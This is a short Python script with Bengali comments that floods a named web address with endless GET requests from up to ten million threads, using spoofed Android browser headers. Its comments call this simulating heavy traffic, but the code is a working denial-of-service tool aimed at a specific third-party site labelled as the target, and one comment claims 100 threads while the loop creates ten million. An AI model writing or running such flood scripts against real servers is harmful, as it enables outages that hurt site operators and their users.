import requests
import threading

# টার্গেট URL
url = "https://dark-x-community.my.id/cgi-sys/suspendedpage.cgi"

# হেডার্স
headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 14; SM-A137F Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.163 Mobile Safari/537.36",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'cache-control': "max-age=0",
  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Android WebView\";v=\"132\"",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'upgrade-insecure-requests': "1",
  'x-requested-with': "mark.via.gp",
  'sec-fetch-site': "none",
  'sec-fetch-mode': "navigate",
  'sec-fetch-user': "?1",
  'sec-fetch-dest': "document",
  'accept-language': "en-GB,en-US;q=0.9,en;q=0.8",
  'priority': "u=0, i"
}

# ভারী ট্রাফিক সিমুলেট করার ফাংশন
def send_requests():
    while True:
        try:
            response = requests.get(url, headers=headers)
            print(f"Response Code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

# মাল্টি-থ্রেডিং ব্যবহার করে ভারী ট্রাফিক সিমুলেট করা
threads = []
for i in range(10000000):  # 100টি থ্রেড তৈরি করুন (আপনার সার্ভার ক্ষমতা অনুযায়ী সংখ্যা পরিবর্তন করুন)
    thread = threading.Thread(target=send_requests)
    thread.start()
    threads.append(thread)

# থ্রেডগুলো শেষ হওয়ার জন্য অপেক্ষা করুন
for thread in threads:
    thread.join()
